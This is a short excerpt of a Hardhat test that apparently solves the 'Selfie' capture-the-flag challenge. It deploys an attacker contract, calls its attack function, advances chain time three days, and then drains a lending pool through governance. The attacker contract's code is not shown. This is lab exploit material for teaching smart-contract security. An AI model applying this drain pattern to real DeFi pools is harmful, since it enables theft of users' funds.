...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        const HackSelfieFactory = await ethers.getContractFactory('HackSelfie', attacker);
        const hackSelfie = await HackSelfieFactory.deploy(this.pool.address, this.token.address, this.governance.address, attacker.address);
        await hackSelfie.attack();
        await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]);
        await hackSelfie.drain();
    });
